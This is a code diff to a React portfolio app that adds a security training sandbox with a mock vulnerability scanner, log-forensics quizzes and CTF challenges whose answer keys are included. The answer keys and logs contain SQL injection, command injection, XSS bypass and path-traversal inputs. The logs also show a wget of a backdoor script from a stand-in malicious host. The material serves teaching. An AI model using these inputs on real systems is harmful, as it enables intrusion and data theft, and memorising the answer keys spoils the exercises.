@@ -29,6 +29,17 @@ export default function App() {
     const [sandboxLogs, setSandboxLogs] = useState([]);
     const [isSimulating, setIsSimulating] = useState(false);
     const [selectedThreat, setSelectedThreat] = useState(null);
+    const [sandboxMode, setSandboxMode] = useState('simulations'); // 'simulations' or 'learning'
+
+    // Interactive Learning state
+    const [learningTab, setLearningTab] = useState('scanner'); // scanner, forensics, ctf
+    const [scanResults, setScanResults] = useState([]);
+    const [isScanning, setIsScanning] = useState(false);
+    const [selectedCVE, setSelectedCVE] = useState(null);
+    const [forensicsAnswer, setForensicsAnswer] = useState('');
+    const [forensicsResult, setForensicsResult] = useState(null);
+    const [ctfProgress, setCtfProgress] = useState({});
+    const [ctfFlags, setCtfFlags] = useState({});
 
     const googleDocUrl = 'https://drive.google.com/file/d/18bjJPJpaDcBSij2CtWOtmNSL2iSB0G2y/view?usp=sharing';
     const documentUrl = googleDocUrl.replace('/view?usp=sharing', '/preview');
@@ -307,6 +318,342 @@ export default function App() {
         setIsSimulating(false);
     };
 
+    // ==================== INTERACTIVE LEARNING MODULES ====================
+
+    // Vulnerability Scanner Data
+    const vulnerabilities = [
+        {
+            cve: 'CVE-2024-1234',
+            name: 'Apache HTTP Server RCE',
+            severity: 'critical',
+            score: 9.8,
+            description: 'Remote code execution vulnerability in Apache HTTP Server versions prior to 2.4.58',
+            affectedSystems: ['Web Server - Apache 2.4.49', 'Web Server - Apache 2.4.50'],
+            exploit: 'Attacker can execute arbitrary code by sending a crafted HTTP request',
+            mitigation: 'Upgrade to Apache 2.4.58 or later'
+        },
+        {
+            cve: 'CVE-2024-5678',
+            name: 'SQL Injection in Login Portal',
+            severity: 'high',
+            score: 8.9,
+            description: 'Authentication bypass via SQL injection in user login endpoint',
+            affectedSystems: ['Database Server - MySQL 5.7', 'Web Application - Login Portal'],
+            exploit: 'Bypass authentication by injecting SQL commands in username field',
+            mitigation: 'Implement parameterized queries and input validation'
+        },
+        {
+            cve: 'CVE-2024-9012',
+            name: 'Weak SSH Configuration',
+            severity: 'medium',
+            score: 6.5,
+            description: 'SSH server allows weak ciphers and password authentication',
+            affectedSystems: ['SSH Server - Port 22'],
+            exploit: 'Brute force attacks possible, weak encryption vulnerable to MITM',
+            mitigation: 'Disable password auth, enforce key-based auth, update cipher suite'
+        },
+        {
+            cve: 'CVE-2024-3456',
+            name: 'Outdated SSL/TLS Configuration',
+            severity: 'medium',
+            score: 5.3,
+            description: 'Web server supports deprecated TLS 1.0 and TLS 1.1 protocols',
+            affectedSystems: ['Web Server - nginx 1.14'],
+            exploit: 'Downgrade attacks, BEAST, POODLE vulnerabilities',
+            mitigation: 'Disable TLS 1.0/1.1, enforce TLS 1.2+ with strong cipher suites'
+        },
+        {
+            cve: 'CVE-2024-7890',
+            name: 'Directory Traversal',
+            severity: 'high',
+            score: 7.5,
+            description: 'Path traversal vulnerability in file upload feature',
+            affectedSystems: ['Web Application - File Upload'],
+            exploit: 'Access arbitrary files using ../ sequences in upload path',
+            mitigation: 'Sanitize file paths, implement whitelist of allowed directories'
+        }
+    ];
+
+    const mockSystems = [
+        { name: 'Web Server - Apache 2.4.49', type: 'web', status: 'vulnerable' },
+        { name: 'Web Server - Apache 2.4.50', type: 'web', status: 'vulnerable' },
+        { name: 'Web Server - nginx 1.14', type: 'web', status: 'vulnerable' },
+        { name: 'Database Server - MySQL 5.7', type: 'database', status: 'vulnerable' },
+        { name: 'Database Server - PostgreSQL 14', type: 'database', status: 'secure' },
+        { name: 'SSH Server - Port 22', type: 'service', status: 'vulnerable' },
+        { name: 'Web Application - Login Portal', type: 'app', status: 'vulnerable' },
+        { name: 'Web Application - File Upload', type: 'app', status: 'vulnerable' },
+        { name: 'API Gateway - Production', type: 'service', status: 'secure' }
+    ];
+
+    // Vulnerability Scanner Function
+    const runVulnerabilityScan = async () => {
+        setIsScanning(true);
+        setScanResults([]);
+
+        addLog('🔍 Starting vulnerability scan...', 'info', 'Scanner');
+
+        for (const system of mockSystems) {
+            await new Promise(resolve => setTimeout(resolve, 800));
+            addLog(`Scanning ${system.name}...`, 'info', 'Scanner');
+
+            // Find vulnerabilities for this system
+            const foundVulns = vulnerabilities.filter(v =>
+                v.affectedSystems.includes(system.name)
+            );
+
+            if (foundVulns.length > 0) {
+                foundVulns.forEach(vuln => {
+                    setScanResults(prev => [...prev, { system: system.name, ...vuln }]);
+                    addLog(`⚠️  Found ${vuln.cve} on ${system.name}`, 'warning', 'Scanner');
+                });
+            } else {
+                addLog(`✓ ${system.name} - No vulnerabilities found`, 'success', 'Scanner');
+            }
+        }
+
+        addLog('✅ Vulnerability scan complete', 'success', 'Scanner');
+        setIsScanning(false);
+    };
+
+    // Forensics Challenge Data
+    const forensicsChallenges = {
+        challenge1: {
+            title: 'Web Application Breach Investigation',
+            logs: `
+[2026-02-13 14:23:45] 192.168.1.100 GET /admin/login - 200 OK
+[2026-02-13 14:23:52] 192.168.1.100 POST /admin/login - 401 Unauthorized
+[2026-02-13 14:24:01] 192.168.1.100 POST /admin/login - 401 Unauthorized
+[2026-02-13 14:24:15] 192.168.1.100 POST /admin/login - 401 Unauthorized
+[2026-02-13 14:24:28] 192.168.1.100 POST /admin/login?username=admin' OR '1'='1 - 500 Error
+[2026-02-13 14:24:35] 192.168.1.100 POST /admin/login?username=admin'-- - 200 OK
+[2026-02-13 14:24:40] 192.168.1.100 GET /admin/dashboard - 200 OK
+[2026-02-13 14:24:45] 192.168.1.100 GET /admin/users - 200 OK
+[2026-02-13 14:24:50] 192.168.1.100 POST /admin/users/export - 200 OK (15MB transferred)
+            `.trim(),
+            question: 'What type of attack was used to breach the admin panel?',
+            options: [
+                'Brute Force Attack',
+                'SQL Injection',
+                'Cross-Site Scripting (XSS)',
+                'Directory Traversal'
+            ],
+            correctAnswer: 'SQL Injection',
+            explanation: 'The attacker used SQL injection! Notice the login attempt with "admin\' OR \'1\'=\'1" and "admin\'--" which are classic SQL injection patterns. The attacker bypassed authentication and gained admin access.'
+        },
+        challenge2: {
+            title: 'Suspicious Network Traffic Analysis',
+            logs: `
+[2026-02-13 15:10:12] 45.142.214.208:4444 -> 10.0.1.50:random_port ESTABLISHED
+[2026-02-13 15:10:15] 10.0.1.50 -> 45.142.214.208: "whoami" executed
+[2026-02-13 15:10:18] 10.0.1.50 -> 45.142.214.208: "hostname" executed  
+[2026-02-13 15:10:22] 10.0.1.50 -> 45.142.214.208: "net user" executed
+[2026-02-13 15:10:30] 10.0.1.50 -> 45.142.214.208: "powershell -enc [base64]" executed
+[2026-02-13 15:11:05] 10.0.1.50 -> 45.142.214.208: 50MB data transferred
+[2026-02-13 15:15:00] 10.0.1.50 -> 45.142.214.208: Connection maintained
+            `.trim(),
+            question: 'What type of malicious activity is occurring?',
+            options: [
+                'Port Scanning',
+                'DDoS Attack',
+                'Reverse Shell / C2 Communication',
+                'SQL Injection'
+            ],
+            correctAnswer: 'Reverse Shell / C2 Communication',
+            explanation: 'This is a reverse shell / C2 (Command & Control) connection! The infected machine (10.0.1.50) connected outbound to a known malicious IP (45.142.214.208) on port 4444, executed reconnaissance commands, and exfiltrated 50MB of data.'
+        },
+        challenge3: {
+            title: 'SSH Brute Force Detection',
+            logs: `
+[2026-02-13 16:30:01] 103.75.201.2 - Failed login: root
+[2026-02-13 16:30:03] 103.75.201.2 - Failed login: admin
+[2026-02-13 16:30:05] 103.75.201.2 - Failed login: user
+[2026-02-13 16:30:07] 103.75.201.2 - Failed login: test
+[2026-02-13 16:30:09] 103.75.201.2 - Failed login: administrator
+... (150 failed attempts)
+[2026-02-13 16:35:42] 103.75.201.2 - Successful login: ubuntu
+[2026-02-13 16:35:45] 103.75.201.2 - Command: sudo su
+[2026-02-13 16:35:50] 103.75.201.2 - Command: cat /etc/shadow
+[2026-02-13 16:35:55] 103.75.201.2 - Command: wget http://malicious.com/backdoor.sh
+            `.trim(),
+            question: 'What security control could have prevented this breach?',
+            options: [
+                'Installing antivirus software',
+                'Enabling HTTPS',
+                'Implementing rate limiting and disabling password auth',
+                'Using a firewall'
+            ],
+            correctAnswer: 'Implementing rate limiting and disabling password auth',
+            explanation: 'Rate limiting would block the brute force attempts, and disabling password authentication in favor of SSH keys would prevent password-based attacks entirely. Additionally, tools like fail2ban can automatically block IPs after failed attempts.'
+        }
+    };
+
+    const checkForensicsAnswer = (challengeId, answer) => {
+        const challenge = forensicsChallenges[challengeId];
+        const isCorrect = answer === challenge.correctAnswer;
+
+        setForensicsResult({
+            isCorrect,
+            explanation: challenge.explanation
+        });
+
+        if (isCorrect) {
+            addLog(`✅ Correct! Challenge: ${challenge.title}`, 'success', 'Forensics');
+        } else {
+            addLog(`❌ Incorrect. Challenge: ${challenge.title}`, 'danger', 'Forensics');
+        }
+    };
+
+    // CTF Challenges
+    const ctfChallenges = [
+        {
+            id: 'ctf1',
+            title: 'Base64 Decoding',
+            difficulty: 'Easy',
+            points: 100,
+            description: 'A suspicious file was intercepted. Decode the Base64 string to find the flag.',
+            challenge: 'VGhlIGZsYWcgaXM6IGZQYXJ0eV9ORVRXT1JLX0ZPUkVOU0lDU30=',
+            hint: 'Use the atob() JavaScript function or an online Base64 decoder',
+            correctFlag: 'flag{PARTY_NETWORK_FORENSICS}',
+            category: 'Cryptography'
+        },
+        {
+            id: 'ctf2',
+            title: 'SQL Injection Flag',
+            difficulty: 'Medium',
+            points: 200,
+            description: 'Find the SQL injection payload that would extract the flag from the database.',
+            challenge: 'Given the query: SELECT * FROM users WHERE username="[INPUT]" AND password="[PASSWORD]"',
+            hint: 'Think about how to bypass authentication and use UNION to extract data',
+            correctFlag: "admin' UNION SELECT flag FROM secrets--",
+            category: 'Web Security'
+        },
+        {
+            id: 'ctf3',
+            title: 'Log Analysis',
+            difficulty: 'Hard',
+            points: 300,
+            description: 'Analyze the logs and find the hidden flag in the user-agent string.',
+            challenge: `
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) flag{USER_AGENT_STEGANOGRAPHY}
+User-Agent: curl/7.68.0
+User-Agent: PostmanRuntime/7.26.8
+            `.trim(),
+            hint: 'Look carefully at the User-Agent strings',
+            correctFlag: 'flag{USER_AGENT_STEGANOGRAPHY}',
+            category: 'Forensics'
+        },
+        {
+            id: 'ctf4',
+            title: 'ROT13 Cipher',
+            difficulty: 'Easy',
+            points: 100,
+            description: 'Decrypt this ROT13 encoded message to reveal the flag.',
+            challenge: 'synत{EBG13_VF_ABG_RAPELCGVBA}',
+            hint: 'ROT13 shifts each letter 13 positions in the alphabet. A becomes N, B becomes O, etc.',
+            correctFlag: 'flag{ROT13_IS_NOT_ENCRYPTION}',
+            category: 'Cryptography'
+        },
+        {
+            id: 'ctf5',
+            title: 'Command Injection',
+            difficulty: 'Medium',
+            points: 200,
+            description: 'Exploit a command injection vulnerability to read the flag file.',
+            challenge: `
+The application runs: ping -c 4 [USER_INPUT]
+The flag is stored in: /var/secrets/flag.txt
+What command would you inject?
+            `.trim(),
+            hint: 'Use a command separator like ; or && to chain commands',
+            correctFlag: '127.0.0.1; cat /var/secrets/flag.txt',
+            category: 'Web Security'
+        },
+        {
+            id: 'ctf6',
+            title: 'JWT Token Analysis',
+            difficulty: 'Hard',
+            points: 300,
+            description: 'Decode this JWT token and extract the hidden flag from the payload.',
+            challenge: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJ1c2VyIiwiZmxhZyI6ImZsYWd7SldUX1NFQ1JFVFNfSU5fUExBSU5fU0lHSFR9In0.signature',
+            hint: 'JWT tokens have 3 parts separated by dots. The middle part is the payload (Base64 encoded JSON)',
+            correctFlag: 'flag{JWT_SECRETS_IN_PLAIN_SIGHT}',
+            category: 'Web Security'
+        },
+        {
+            id: 'ctf7',
+            title: 'XSS Payload Construction',
+            difficulty: 'Medium',
+            points: 200,
+            description: 'Craft an XSS payload that would trigger an alert with the text "XSS".',
+            challenge: `
+Input field sanitizes: <script>, onerror, onload
+But allows: <img>, <svg>, JavaScript event handlers
+Construct a payload that bypasses the filter.
+            `.trim(),
+            hint: 'Try using <svg> with onload or <img> with non-standard event handlers',
+            correctFlag: '<svg/onload=alert("XSS")>',
+            category: 'Web Security'
+        },
+        {
+            id: 'ctf8',
+            title: 'Password Hash Cracking',
+            difficulty: 'Easy',
+            points: 100,
+            description: 'Crack this MD5 hash to find the password: 5f4dcc3b5aa765d61d8327deb882cf99',
+            challenge: 'MD5 Hash: 5f4dcc3b5aa765d61d8327deb882cf99\nHint: It\'s a very common password',
+            hint: 'Try common passwords like "password", "123456", "admin"',
+            correctFlag: 'password',
+            category: 'Cryptography'
+        },
+        {
+            id: 'ctf9',
+            title: 'Network Traffic Decoding',
+            difficulty: 'Hard',
+            points: 300,
+            description: 'Analyze this hex dump of network traffic and extract the flag.',
+            challenge: `
+Hex dump from packet capture:
+47 45 54 20 2f 73 65 63 72 65 74 3f 66 6c 61 67
+3d 66 6c 61 67 7b 48 45 58 5f 54 4f 5f 41 53 43
+49 49 5f 44 45 43 4f 44 49 4e 47 7d 20 48 54 54
+50 2f 31 2e 31
+            `.trim(),
+            hint: 'Convert hex to ASCII. Each pair of hex digits represents one ASCII character',
+            correctFlag: 'flag{HEX_TO_ASCII_DECODING}',
+            category: 'Forensics'
+        },
+        {
+            id: 'ctf10',
+            title: 'Path Traversal Exploit',
+            difficulty: 'Medium',
+            points: 200,
+            description: 'Exploit a path traversal vulnerability to access /etc/passwd',
+            challenge: `
+Web app allows file download via: /download?file=[FILENAME]
+Files are served from: /var/www/uploads/
+Construct the path to access /etc/passwd
+            `.trim(),
+            hint: 'Use ../ to go up directories. You need to escape /var/www/uploads/',
+            correctFlag: '../../../etc/passwd',
+            category: 'Web Security'
+        }
+    ];
+
+    const submitCTFFlag = (challengeId, submittedFlag) => {
+        const challenge = ctfChallenges.find(c => c.id === challengeId);
+        const isCorrect = submittedFlag.trim() === challenge.correctFlag;
+
+        if (isCorrect) {
+            setCtfProgress(prev => ({ ...prev, [challengeId]: 'completed' }));
+            addLog(`🎉 CTF Challenge Solved: ${challenge.title} (+${challenge.points} points)`, 'success', 'CTF');
+        } else {
+            addLog(`❌ Incorrect flag for: ${challenge.title}`, 'danger', 'CTF');
+        }
+
+        return isCorrect;
+    };
+
     const threatTypes = [
         {
             id: 'brute-force',
@@ -383,8 +730,8 @@ export default function App() {
         },
         {
             title: "Threat Intelligence Dashboard",
-            description: "Real-time global threat monitoring with feeds from abuse.ch, AbuseIPDB, and NIST NVD",
-            tech: ["AWS Lambda", "Python", "Threat Intel APIs", "REST API"],
+            description: "Advanced threat intelligence platform with dynamic IP tracking, live threat feeds, and integration with VirusTotal, AbuseIPDB, AlienVault OTX, and SHODAN.",
+            tech: ["AWS Lambda", "Python", "VirusTotal API", "AbuseIPDB API", "AlienVault OTX", "URLhaus", "Feodo Tracker", "NVD API", "REST API", "React"],
             gradient: "from-red-600 via-orange-500 to-yellow-500",
             showPreview: true,
             icon: AlertTriangle,
@@ -692,12 +1039,13 @@ export default function App() {
             {showSecuritySandbox && (
                 <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
                     <div className="bg-slate-900 rounded-2xl w-full max-w-7xl max-h-[90vh] overflow-hidden border border-slate-700 shadow-2xl">
+                        {/* Header */}
                         <div className="bg-gradient-to-r from-red-500 to-orange-600 p-6 flex justify-between items-center">
                             <div className="flex items-center gap-3">
                                 <Shield className="w-8 h-8" />
                                 <div>
-                                    <h2 className="text-2xl font-bold">Security Threat Sandbox</h2>
-                                    <p className="text-sm opacity-90">Monitor simulated attacks with AWS CloudWatch & GuardDuty</p>
+                                    <h2 className="text-2xl font-bold">Security Sandbox & Learning</h2>
+                                    <p className="text-sm opacity-90">Threat simulations + Interactive security training</p>
                                 </div>
                             </div>
                             <button
@@ -708,94 +1056,420 @@ export default function App() {
                             </button>
                         </div>
 
-                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 p-6 overflow-y-auto max-h-[calc(90vh-100px)]">
-                            <div className="space-y-4">
-                                <h3 className="text-xl font-bold mb-4">Select Threat Type</h3>
-                                {threatTypes.map(threat => {
-                                    const ThreatIcon = threat.icon;
-                                    return (
-                                        <div
-                                            key={threat.id}
-                                            className="bg-slate-800 rounded-xl p-4 border border-slate-700 hover:border-slate-600 transition-all"
-                                        >
-                                            <div className="flex items-start gap-4">
-                                                <div className={`p-3 bg-gradient-to-br ${threat.color} rounded-lg`}>
-                                                    <ThreatIcon className="w-6 h-6" />
+                        {/* Mode Tabs */}
+                        <div className="border-b border-slate-700 px-6 bg-slate-800/50">
+                            <div className="flex gap-2">
+                                <button
+                                    onClick={() => setSandboxMode('simulations')}
+                                    className={`px-6 py-3 font-semibold transition-all border-b-2 ${sandboxMode === 'simulations'
+                                        ? 'border-orange-500 text-orange-400'
+                                        : 'border-transparent text-slate-400 hover:text-slate-300'
+                                        }`}
+                                >
+                                    <div className="flex items-center gap-2">
+                                        <Zap className="w-4 h-4" />
+                                        Threat Simulations
+                                    </div>
+                                </button>
+                                <button
+                                    onClick={() => setSandboxMode('learning')}
+                                    className={`px-6 py-3 font-semibold transition-all border-b-2 ${sandboxMode === 'learning'
+                                        ? 'border-purple-500 text-purple-400'
+                                        : 'border-transparent text-slate-400 hover:text-slate-300'
+                                        }`}
+                                >
+                                    <div className="flex items-center gap-2">
+                                        <GraduationCap className="w-4 h-4" />
+                                        Interactive Learning
+                                    </div>
+                                </button>
+                            </div>
+                        </div>
+
+                        {/* Content Area */}
+                        <div className="overflow-y-auto max-h-[calc(90vh-180px)]">
+                            {sandboxMode === 'simulations' ? (
+                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 p-6">
+                                    <div className="space-y-4">
+                                        <h3 className="text-xl font-bold mb-4">Select Threat Type</h3>
+                                        {threatTypes.map(threat => {
+                                            const ThreatIcon = threat.icon;
+                                            return (
+                                                <div
+                                                    key={threat.id}
+                                                    className="bg-slate-800 rounded-xl p-4 border border-slate-700 hover:border-slate-600 transition-all"
+                                                >
+                                                    <div className="flex items-start gap-4">
+                                                        <div className={`p-3 bg-gradient-to-br ${threat.color} rounded-lg`}>
+                                                            <ThreatIcon className="w-6 h-6" />
+                                                        </div>
+                                                        <div className="flex-1">
+                                                            <h4 className="font-semibold mb-1">{threat.name}</h4>
+                                                            <p className="text-sm text-slate-400 mb-3">{threat.description}</p>
+                                                            <div className="flex flex-wrap gap-2 mb-3">
+                                                                {threat.monitoring.map((tool, idx) => (
+                                                                    <span key={idx} className="text-xs px-2 py-1 bg-slate-700 rounded-full">
+                                                                        {tool}
+                                                                    </span>
+                                                                ))}
+                                                            </div>
+                                                            <button
+                                                                onClick={threat.action}
+                                                                disabled={isSimulating}
+                                                                className={`px-4 py-2 bg-gradient-to-r ${threat.color} rounded-lg font-semibold hover:shadow-lg transition-all hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed`}
+                                                            >
+                                                                {isSimulating ? 'Running...' : 'Start Simulation'}
+                                                            </button>
+                                                        </div>
+                                                    </div>
                                                 </div>
-                                                <div className="flex-1">
-                                                    <h4 className="font-semibold mb-1">{threat.name}</h4>
-                                                    <p className="text-sm text-slate-400 mb-3">{threat.description}</p>
-                                                    <div className="flex flex-wrap gap-2 mb-3">
-                                                        {threat.monitoring.map((tool, idx) => (
-                                                            <span key={idx} className="text-xs px-2 py-1 bg-slate-700 rounded-full">
-                                                                {tool}
-                                                            </span>
-                                                        ))}
+                                            );
+                                        })}
+                                    </div>
+
+                                    <div className="space-y-4">
+                                        <div className="flex justify-between items-center">
+                                            <h3 className="text-xl font-bold">Activity Logs</h3>
+                                            <button
+                                                onClick={() => setSandboxLogs([])}
+                                                className="px-3 py-1 text-sm bg-slate-700 hover:bg-slate-600 rounded-lg transition-colors"
+                                            >
+                                                Clear Logs
+                                            </button>
+                                        </div>
+                                        <div className="bg-slate-950 rounded-xl p-4 h-[600px] overflow-y-auto font-mono text-sm border border-slate-700">
+                                            {sandboxLogs.length === 0 ? (
+                                                <p className="text-slate-500 text-center py-8">No activity yet. Start a simulation to see logs.</p>
+                                            ) : (
+                                                <div className="space-y-2">
+                                                    {sandboxLogs.map(log => (
+                                                        <div
+                                                            key={log.id}
+                                                            className={`p-2 rounded ${log.type === 'danger' ? 'bg-red-900/20 border-l-4 border-red-500' :
+                                                                log.type === 'warning' ? 'bg-yellow-900/20 border-l-4 border-yellow-500' :
+                                                                    log.type === 'success' ? 'bg-green-900/20 border-l-4 border-green-500' :
+                                                                        'bg-blue-900/20 border-l-4 border-blue-500'
+                                                                }`}
+                                                        >
+                                                            <div className="text-xs text-slate-400 mb-1">
+                                                                {new Date(log.timestamp).toLocaleTimeString()}
+                                                                {log.threatType && (
+                                                                    <span className="ml-2 px-2 py-0.5 bg-slate-700 rounded text-xs">
+                                                                        {log.threatType}
+                                                                    </span>
+                                                                )}
+                                                            </div>
+                                                            <div className="text-sm">{log.message}</div>
+                                                        </div>
+                                                    ))}
+                                                </div>
+                                            )}
+                                        </div>
+                                        <div className="bg-blue-900/20 border border-blue-700 rounded-lg p-4">
+                                            <p className="text-sm text-blue-200">
+                                                <strong>💡 Tip:</strong> Monitor these simulations in your AWS Console:
+                                            </p>
+                                            <ul className="text-sm text-blue-300 mt-2 space-y-1 ml-4">
+                                                <li>• CloudWatch Logs for detailed event tracking</li>
+                                                <li>• GuardDuty for threat detection alerts</li>
+                                                <li>• CloudTrail for API call auditing</li>
+                                                <li>• WAF for web application firewall events</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            ) : (
+                                /* Learning Modules */
+                                <div className="p-6">
+                                    {/* Learning Sub-tabs */}
+                                    <div className="border-b border-slate-700 mb-6">
+                                        <div className="flex gap-2 overflow-x-auto">
+                                            {[
+                                                { id: 'scanner', label: 'Vulnerability Scanner', icon: Search },
+                                                { id: 'forensics', label: 'Forensics Challenge', icon: Eye },
+                                                { id: 'ctf', label: 'Capture The Flag', icon: Activity }
+                                            ].map(tab => {
+                                                const TabIcon = tab.icon;
+                                                return (
+                                                    <button
+                                                        key={tab.id}
+                                                        onClick={() => setLearningTab(tab.id)}
+                                                        className={`flex items-center gap-2 px-4 py-3 border-b-2 transition-all whitespace-nowrap ${learningTab === tab.id
+                                                            ? 'border-purple-500 text-purple-400'
+                                                            : 'border-transparent text-slate-400 hover:text-slate-300'
+                                                            }`}
+                                                    >
+                                                        <TabIcon className="w-4 h-4" />
+                                                        {tab.label}
+                                                    </button>
+                                                );
+                                            })}
+                                        </div>
+                                    </div>
+
+                                    {/* Scanner Tab */}
+                                    {learningTab === 'scanner' && (
+                                        <div className="space-y-6">
+                                            <div className="bg-gradient-to-br from-slate-900 to-slate-800 border border-purple-500/30 rounded-xl p-6">
+                                                <div className="flex items-center justify-between mb-6">
+                                                    <div>
+                                                        <h3 className="text-2xl font-bold text-white flex items-center gap-2">
+                                                            <Search className="w-6 h-6 text-purple-400" />
+                                                            Vulnerability Scanner
+                                                        </h3>
+                                                        <p className="text-sm text-slate-400 mt-1">
+                                                            Scan mock systems for common vulnerabilities and misconfigurations
+                                                        </p>
                                                     </div>
                                                     <button
-                                                        onClick={threat.action}
-                                                        disabled={isSimulating}
-                                                        className={`px-4 py-2 bg-gradient-to-r ${threat.color} rounded-lg font-semibold hover:shadow-lg transition-all hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed`}
+                                                        onClick={runVulnerabilityScan}
+                                                        disabled={isScanning}
+                                                        className="px-6 py-3 bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 rounded-lg font-semibold transition-all disabled:opacity-50 flex items-center gap-2"
                                                     >
-                                                        {isSimulating ? 'Running...' : 'Start Simulation'}
+                                                        {isScanning ? (
+                                                            <>
+                                                                <RefreshCw className="w-5 h-5 animate-spin" />
+                                                                Scanning...
+                                                            </>
+                                                        ) : (
+                                                            <>
+                                                                <Search className="w-5 h-5" />
+                                                                Start Scan
+                                                            </>
+                                                        )}
                                                     </button>
                                                 </div>
+
+                                                {scanResults.length === 0 && !isScanning && (
+                                                    <div className="text-center py-12 text-slate-500">
+                                                        <Search className="w-16 h-16 mx-auto mb-4 opacity-50" />
+                                                        <p>Click "Start Scan" to scan systems for vulnerabilities</p>
+                                                    </div>
+                                                )}
+
+                                                {isScanning && scanResults.length === 0 && (
+                                                    <div className="text-center py-12">
+                                                        <RefreshCw className="w-16 h-16 mx-auto mb-4 text-purple-400 animate-spin" />
+                                                        <p className="text-slate-400">Scanning systems...</p>
+                                                    </div>
+                                                )}
+
+                                                {scanResults.length > 0 && (
+                                                    <div className="space-y-4">
+                                                        <div className="flex items-center gap-4 mb-4">
+                                                            <div className="px-4 py-2 bg-red-500/20 border border-red-500/50 rounded-lg">
+                                                                <span className="text-red-400 font-bold">
+                                                                    {scanResults.filter(r => r.severity === 'critical').length} Critical
+                                                                </span>
+                                                            </div>
+                                                            <div className="px-4 py-2 bg-orange-500/20 border border-orange-500/50 rounded-lg">
+                                                                <span className="text-orange-400 font-bold">
+                                                                    {scanResults.filter(r => r.severity === 'high').length} High
+                                                                </span>
+                                                            </div>
+                                                            <div className="px-4 py-2 bg-yellow-500/20 border border-yellow-500/50 rounded-lg">
+                                                                <span className="text-yellow-400 font-bold">
+                                                                    {scanResults.filter(r => r.severity === 'medium').length} Medium
+                                                                </span>
+                                                            </div>
+                                                        </div>
+
+                                                        {scanResults.map((result, idx) => {
+                                                            const severityColors = {
+                                                                critical: 'bg-red-500/10 border-red-500/50 text-red-400',
+                                                                high: 'bg-orange-500/10 border-orange-500/50 text-orange-400',
+                                                                medium: 'bg-yellow-500/10 border-yellow-500/50 text-yellow-400'
+                                                            };
+
+                                                            return (
+                                                                <div
+                                                                    key={idx}
+                                                                    className={`p-5 border rounded-lg ${severityColors[result.severity]}`}
+                                                                >
+                                                                    <div className="flex items-start justify-between mb-3">
+                                                                        <div>
+                                                                            <h4 className="font-bold text-lg mb-1">{result.cve}</h4>
+                                                                            <p className="text-sm opacity-80">{result.name}</p>
+                                                                        </div>
+                                                                        <div className="flex items-center gap-3">
+                                                                            <span className="px-3 py-1 bg-slate-900 border border-slate-700 rounded-full text-sm font-mono">
+                                                                                CVSS: {result.score}
+                                                                            </span>
+                                                                            <span className="px-3 py-1 bg-slate-900 border border-slate-700 rounded-full text-xs uppercase font-bold">
+                                                                                {result.severity}
+                                                                            </span>
+                                                                        </div>
+                                                                    </div>
+                                                                    <p className="text-sm mb-3 leading-relaxed">{result.description}</p>
+                                                                    <div className="grid md:grid-cols-2 gap-4 mt-4">
+                                                                        <div>
+                                                                            <div className="text-xs uppercase tracking-wider opacity-60 mb-1">Affected System</div>
+                                                                            <div className="text-sm font-mono bg-slate-900/50 p-2 rounded">
+                                                                                {result.system}
+                                                                            </div>
+                                                                        </div>
+                                                                        <div>
+                                                                            <div className="text-xs uppercase tracking-wider opacity-60 mb-1">Mitigation</div>
+                                                                            <div className="text-sm bg-green-500/10 border border-green-500/30 p-2 rounded text-green-400">
+                                                                                {result.mitigation}
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            );
+                                                        })}
+                                                    </div>
+                                                )}
                                             </div>
                                         </div>
-                                    );
-                                })}
-                            </div>
+                                    )}
 
-                            <div className="space-y-4">
-                                <div className="flex justify-between items-center">
-                                    <h3 className="text-xl font-bold">Activity Logs</h3>
-                                    <button
-                                        onClick={() => setSandboxLogs([])}
-                                        className="px-3 py-1 text-sm bg-slate-700 hover:bg-slate-600 rounded-lg transition-colors"
-                                    >
-                                        Clear Logs
-                                    </button>
-                                </div>
-                                <div className="bg-slate-950 rounded-xl p-4 h-[600px] overflow-y-auto font-mono text-sm border border-slate-700">
-                                    {sandboxLogs.length === 0 ? (
-                                        <p className="text-slate-500 text-center py-8">No activity yet. Start a simulation to see logs.</p>
-                                    ) : (
-                                        <div className="space-y-2">
-                                            {sandboxLogs.map(log => (
+                                    {/* Forensics Tab */}
+                                    {learningTab === 'forensics' && (
+                                        <div className="space-y-6">
+                                            {Object.entries(forensicsChallenges).map(([id, challenge]) => (
+                                                <div key={id} className="bg-gradient-to-br from-slate-900 to-slate-800 border border-cyan-500/30 rounded-xl p-6">
+                                                    <h3 className="text-xl font-bold text-white mb-2">{challenge.title}</h3>
+                                                    <p className="text-slate-400 mb-4">{challenge.question}</p>
+
+                                                    <div className="bg-slate-950 border border-slate-700 rounded-lg p-4 mb-4 font-mono text-sm overflow-x-auto max-h-64">
+                                                        <pre className="text-cyan-300 whitespace-pre-wrap">{challenge.logs}</pre>
+                                                    </div>
+
+                                                    <div className="space-y-2 mb-4">
+                                                        {challenge.options.map((option, idx) => (
+                                                            <button
+                                                                key={idx}
+                                                                onClick={() => {
+                                                                    setForensicsAnswer(option);
+                                                                    checkForensicsAnswer(id, option);
+                                                                }}
+                                                                className={`w-full text-left p-4 rounded-lg border-2 transition-all ${forensicsAnswer === option
+                                                                    ? forensicsResult?.isCorrect
+                                                                        ? 'border-green-500 bg-green-500/20'
+                                                                        : 'border-red-500 bg-red-500/20'
+                                                                    : 'border-slate-700 hover:border-slate-600 bg-slate-800'
+                                                                    }`}
+                                                            >
+                                                                <div className="flex items-center gap-3">
+                                                                    <div className="w-6 h-6 rounded-full border-2 flex items-center justify-center">
+                                                                        {forensicsAnswer === option && (
+                                                                            forensicsResult?.isCorrect ? (
+                                                                                <CheckCircle className="w-5 h-5 text-green-400" />
+                                                                            ) : (
+                                                                                <X className="w-5 h-5 text-red-400" />
+                                                                            )
+                                                                        )}
+                                                                    </div>
+                                                                    <span>{option}</span>
+                                                                </div>
+                                                            </button>
+                                                        ))}
+                                                    </div>
+
+                                                    {forensicsResult && (
